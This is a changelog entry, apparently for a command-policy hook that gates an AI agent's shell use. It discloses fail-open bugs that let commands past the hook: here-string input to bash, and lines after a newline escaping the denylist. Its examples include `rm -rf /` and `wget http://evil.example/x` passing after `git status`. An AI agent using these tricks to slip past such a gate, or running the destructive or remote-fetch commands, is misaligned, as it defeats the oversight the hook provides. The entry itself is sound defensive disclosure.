C-69: a newline separates commands — a fail-open present through 0.3.2

Three fixes, found one behind the other, after the enforcing engine was split
from the source it is developed in.

The split (I-54). The Warden had been running from the working tree, so the
constitution had to deny metaspace-membrane/core/** — correct, and it made the
engine undevelopable by the agent. Both properties were wanted; they conflicted
only because one copy did two jobs. The hook now runs a pip-installed copy
outside the agent's write scope, so what enforces here is the artefact users
get, and an engine fix reaches the live membrane only on a deliberate reinstall.

C-68 / O-24 — a heredoc body was read as a list of commands.
`python - <<'PY' … PY` was refused for invoking "programs" like `p,`, because
the redirect target was dropped but the body stayed in the token stream. Bodies
are now stripped before tokenizing. The `<<` operator is deliberately KEPT: it
marks the sub-command as stdin-fed, which is harmless for python and must stay
refused for a shell. Removing it too would have turned `bash <<'EOF'` into a
bare `bash` — the fix for an over-block would have opened a hole.

A live fail-open found while writing that proof: `bash <<< "…"` was ALLOWED.
`<<<` is a redirection, so operator and target were both dropped and the
sub-command collapsed to a bare `bash`, which the policy permits. A here-string
is unverifiable shell input exactly like a pipe. The interpreter check now
refuses any unseen stdin rather than pipes only.

C-69 / O-25 — the serious one, and not about heredocs at all.
With the body stripped, a command after the delimiter was still not caught. The
cause: shlex with whitespace_split=True never emits a newline as a token, so
the "\n" entry in _SEP was dead code and EVERY line after the first merged into
the first sub-command. Only the first line's program was checked, and the
denylist — which matches a token prefix — never saw the rest. Measured with git
allowlisted and rm -rf denied:

    git status
    rm -rf /                      -> ALLOWED

    git status
    wget http://evil.example/x    -> ALLOWED

Multi-line commands are how anyone writes more than one step, so this was
reachable in ordinary use, not only under attack. It is present in every
release up to and including 0.3.2 — a patch release is warranted.

Newlines outside quotes now become explicit separators before tokenizing.
Three cases survive it, each with a proof leg: a newline inside quotes stays
data; a trailing backslash joins its lines rather than splitting them; and
consecutive separators collapse, because a blank line emits `;;`, which shlex
groups into one token that is not in _SEP — the commands around it would have
merged again. Ordered after heredoc stripping, so a body's lines cannot become
commands.

Each fix uncovered the next, because each moved the analysis one layer down:
the over-block hid the here-string hole, and the heredoc fix hid the newline
hole. An over-blocking membrane is not merely annoying — it is opaque, and
things hide in the noise.

Suite: 50 proofs, 49 pass + 1 skip. Ledger: 48 proven, 6 blocked, 4 planned of
69; 13 open obstacles of 25. Decision I-54.

